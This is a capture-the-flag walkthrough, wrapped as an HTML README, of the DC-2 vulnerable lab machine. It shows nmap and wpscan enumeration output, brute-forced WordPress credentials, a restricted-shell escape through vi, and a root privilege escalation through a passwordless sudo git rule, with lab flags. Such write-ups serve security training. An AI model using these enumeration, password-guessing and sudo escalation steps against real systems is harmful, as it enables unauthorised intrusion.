@@ -1,0 +1,299 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body>IP - 10.0.2.32<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/DC_2]<br/>
+└─# nmap -sC -sV 10.0.2.32 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 04:11 +0630<br/>
+Nmap scan report for dc-2 (10.0.2.32)<br/>
+Host is up (0.00017s latency).<br/>
+Not shown: 65533 closed tcp ports (reset)<br/>
+PORT &nbsp; &nbsp; STATE SERVICE VERSION<br/>
+80/tcp &nbsp; open &nbsp;http &nbsp; &nbsp;Apache httpd 2.4.10 ((Debian))<br/>
+|_http-server-header: Apache/2.4.10 (Debian)<br/>
+|_http-title: DC-2 &amp;#8211; Just another WordPress site<br/>
+|_http-generator: WordPress 4.7.10<br/>
+7744/tcp open &nbsp;ssh &nbsp; &nbsp; OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+| &nbsp; 1024 52517b6e70a4337ad24be10b5a0f9ed7 (DSA)<br/>
+| &nbsp; 2048 5911d8af38518f41a744b32803809942 (RSA)<br/>
+| &nbsp; 256 df181d7426cec14f6f2fc12654315191 (ECDSA)<br/>
+|_ &nbsp;256 d9385f997c0d647e1d46f6e97cc63717 (ED25519)<br/>
+MAC Address: 08:00:27:60:A9:C3 (Oracle VirtualBox virtual NIC)<br/>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 11.13 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+wpscan result<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# wpscan -e u,ap --url http://dc-2/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+_______________________________________________________________<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;__ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;_______ &nbsp; _____<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\ \ &nbsp; &nbsp; &nbsp; &nbsp;/ / &nbsp;__ \ / ____|<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \ \ &nbsp;/\ &nbsp;/ /| |__) | (___ &nbsp; ___ &nbsp;__ _ _ __ ®<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\ \/ &nbsp;\/ / | &nbsp;___/ \___ \ / __|/ _` | '_ \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \ &nbsp;/\ &nbsp;/ &nbsp;| | &nbsp; &nbsp; ____) | (__| (_| | | | |<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\/ &nbsp;\/ &nbsp; |_| &nbsp; &nbsp;|_____/ \___|\__,_|_| |_|<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;WordPress Security Scanner by the WPScan Team<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Version 3.8.22<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;Sponsored by Automattic - https://automattic.com/<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;@_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br/>
+_______________________________________________________________<br/>
+<br/>
+[+] URL: http://dc-2/ [10.0.2.32]<br/>
+[+] Started: Mon Feb 20 04:16:00 2023<br/>
+<br/>
+Interesting Finding(s):<br/>
+<br/>
+[+] Headers<br/>
+&nbsp;| Interesting Entry: Server: Apache/2.4.10 (Debian)<br/>
+&nbsp;| Found By: Headers (Passive Detection)<br/>
+&nbsp;| Confidence: 100%<br/>
+<br/>
+[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php<br/>
+&nbsp;| Found By: Direct Access (Aggressive Detection)<br/>
+&nbsp;| Confidence: 100%<br/>
+&nbsp;| References:<br/>
+&nbsp;| &nbsp;- http://codex.wordpress.org/XML-RPC_Pingback_API<br/>
+&nbsp;| &nbsp;- https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br/>
+&nbsp;| &nbsp;- https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br/>
+&nbsp;| &nbsp;- https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br/>
+&nbsp;| &nbsp;- https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br/>
+<br/>
+[+] WordPress readme found: http://dc-2/readme.html<br/>
+&nbsp;| Found By: Direct Access (Aggressive Detection)<br/>
+&nbsp;| Confidence: 100%<br/>
+<br/>
+[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php<br/>
+&nbsp;| Found By: Direct Access (Aggressive Detection)<br/>
+&nbsp;| Confidence: 60%<br/>
+&nbsp;| References:<br/>
+&nbsp;| &nbsp;- https://www.iplocation.net/defend-wordpress-from-ddos<br/>
+&nbsp;| &nbsp;- https://github.com/wpscanteam/wpscan/issues/1299<br/>
+<br/>
+[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).<br/>
+&nbsp;| Found By: Rss Generator (Passive Detection)<br/>
+&nbsp;| &nbsp;- http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;<br/>
+&nbsp;| &nbsp;- http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;<br/>
+<br/>
+[+] WordPress theme in use: twentyseventeen<br/>
+&nbsp;| Location: http://dc-2/wp-content/themes/twentyseventeen/<br/>
+&nbsp;| Last Updated: 2022-11-02T00:00:00.000Z<br/>
+&nbsp;| Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt<br/>
+&nbsp;| [!] The version is out of date, the latest version is 3.1<br/>
+&nbsp;| Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10<br/>
+&nbsp;| Style Name: Twenty Seventeen<br/>
+&nbsp;| Style URI: https://wordpress.org/themes/twentyseventeen/<br/>
+&nbsp;| Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...<br/>
+&nbsp;| Author: the WordPress team<br/>
+&nbsp;| Author URI: https://wordpress.org/<br/>
+&nbsp;|<br/>
+&nbsp;| Found By: Css Style In Homepage (Passive Detection)<br/>
+&nbsp;|<br/>
+&nbsp;| Version: 1.2 (80% confidence)<br/>
+&nbsp;| Found By: Style (Passive Detection)<br/>
+&nbsp;| &nbsp;- http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'<br/>
+<br/>
+[+] Enumerating All Plugins (via Passive Methods)<br/>
+<br/>
+[i] No plugins Found.<br/>
+<br/>
+[+] Enumerating Users (via Passive and Aggressive Methods)<br/>
+&nbsp;Brute Forcing Author IDs - Time: 00:00:00 &lt;=================================================================&gt; (10 / 10) 100.00% Time: 00:00:00<br/>
+<br/>
+[i] User(s) Identified:<br/>
+<br/>
+[+] admin<br/>
+&nbsp;| Found By: Rss Generator (Passive Detection)<br/>
+&nbsp;| Confirmed By:<br/>
+&nbsp;| &nbsp;Wp Json Api (Aggressive Detection)<br/>
+&nbsp;| &nbsp; - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br/>
+&nbsp;| &nbsp;Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br/>
+&nbsp;| &nbsp;Login Error Messages (Aggressive Detection)<br/>
+<br/>
+[+] jerry<br/>
+&nbsp;| Found By: Wp Json Api (Aggressive Detection)<br/>
+&nbsp;| &nbsp;- http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br/>
+&nbsp;| Confirmed By:<br/>
+&nbsp;| &nbsp;Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br/>
+&nbsp;| &nbsp;Login Error Messages (Aggressive Detection)<br/>
+<br/>
+[+] tom<br/>
+&nbsp;| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br/>
+&nbsp;| Confirmed By: Login Error Messages (Aggressive Detection)<br/>
+<br/>
+[!] No WPScan API Token given, as a result vulnerability data has not been output.<br/>
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register<br/>
+<br/>
+[+] Finished: Mon Feb 20 04:16:04 2023<br/>
+[+] Requests Done: 27<br/>
+[+] Cached Requests: 37<br/>
+[+] Data Sent: 7.041 KB<br/>
+[+] Data Received: 178.184 KB<br/>
+[+] Memory used: 243.34 MB<br/>
+[+] Elapsed time: 00:00:04<br/>
+<br/>
+Found 3 users:<br/>
+<br/>
+admin<br/>
+tom<br/>
+jerry<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+I found a flag page:<br/>
+<br/>
+http://dc-2/index.php/flag/<br/>
+<br/>
+It suggest to use cewl the website and use as password for bruteforce. So, I cewl the website and bruteforce with burpsuite and found user "tom" and "jerry" password:<br/>
+<br/>
+username - tom<br/>
+password - parturient<br/>
+<br/>
+username - jerry<br/>
+password - adipiscing<br/>
+<br/>
+Login as jerry and found flag-2:<br/>
+<br/>
+http://dc-2/index.php/flag-2/<br/>
+<br/>
+http://dc-2/wp-admin/post.php?post=21&amp;action=edit<br/>
+<br/>
+Flag 2:<br/>
+<br/>
+If you can't exploit WordPress and take a shortcut, there is another way.<br/>
+<br/>
+Hope you found another entry point.<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Login ssh with tom credential<br/>
+<br/>
+username - tom<br/>
+password - parturient<br/>
+<br/>
+rbash shell escape<br/>
+<br/>
+Step 1:<br/>
+<br/>
+I look at into tom binary path and found:<br/>
+<br/>
+echo $PATH<br/>
+<br/>
+tom@DC-2:~$ echo $PATH<br/>
+/home/tom/usr/bin<br/>
+<br/>
+Step 2:<br/>
+<br/>
+under "bin" I found that I can only use these 4 binary:<br/>
+<br/>
+tom@DC-2:~$ /home/tom/usr/bin/<br/>
+less &nbsp;ls &nbsp; &nbsp;scp &nbsp; vi<br/>
+<br/>
+Step 3:<br/>
+<br/>
+I search shell escape for these binary at gtfobin and escape with "vi":<br/>
+<br/>
+https://gtfobins.github.io/gtfobins/vi/#shell<br/>
+<br/>
+vi<br/>
+:set shell=/bin/sh<br/>
+:shell<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+flag3.txt<br/>
+<br/>
+Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+flag4.txt<br/>
+<br/>
+Good to see that you've made it this far - but you're not home yet. <br/>
+<br/>
+You still need to get the final flag (the only flag that really counts!!!). &nbsp;<br/>
+<br/>
+No hints here - you're on your own now. &nbsp;:-)<br/>
+<br/>
+Go on - git outta here!!!!<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+I swith into jerry:<br/>
+<br/>
+username - jerry<br/>
+password - adipiscing<br/>
+<br/>
+$ /bin/su jerry<br/>
+Password: <br/>
+jerry@DC-2:/usr/bin$ whoami<br/>
+jerry<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Privilege Escalation ((root) NOPASSWD: /usr/bin/git)<br/>
+<br/>
+I execute sudo -l and found:<br/>
+<br/>
+(root) NOPASSWD: /usr/bin/git<br/>
+<br/>
+So, I search at gtobin again and got root shell:<br/>
+<br/>
+https://gtfobins.github.io/gtfobins/git/#sudo<br/>
+<br/>
+sudo git -p help config<br/>
+!/bin/sh<br/>
+<br/>
+Step 1:<br/>
+<br/>
+sudo git -p help config<br/>
+<br/>
+Step 2:<br/>
+<br/>
+!/bin/sh<br/>
+<br/>
+Step 3:<br/>
+<br/>
+# whoami<br/>
+root<br/>
+<br/>
+# cat final-flag.txt<br/>
+&nbsp;__ &nbsp; &nbsp;__ &nbsp; &nbsp; _ _ &nbsp; &nbsp; &nbsp; _ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;_ <br/>
+/ / /\ \ \___| | | &nbsp; __| | ___ &nbsp;_ __ &nbsp; ___ &nbsp;/ \<br/>
+\ \/ &nbsp;\/ / _ \ | | &nbsp;/ _` |/ _ \| '_ \ / _ \/ &nbsp;/<br/>
+&nbsp;\ &nbsp;/\ &nbsp;/ &nbsp;__/ | | | (_| | (_) | | | | &nbsp;__/\_/ <br/>
+&nbsp; \/ &nbsp;\/ \___|_|_| &nbsp;\__,_|\___/|_| |_|\___\/ &nbsp; <br/>
+<br/>
+<br/>
+Congratulatons!!!<br/>
+<br/>
+A special thanks to all those who sent me tweets<br/>
+and provided me with feedback - it's all greatly<br/>
+appreciated.<br/>
+<br/>
+If you enjoyed this CTF, send me a tweet via @DCAU7.<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Offensive Security Playground lab flag<br/>
+<br/>
+# cat proof.txt<br/>
+ef155b9e2e622ac22609ceb18c701c24<br/>
+<br/>
+# cat local.txt<br/>
+f0c25da68c64483d4b9c705c8ef87d28<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------</body></html>
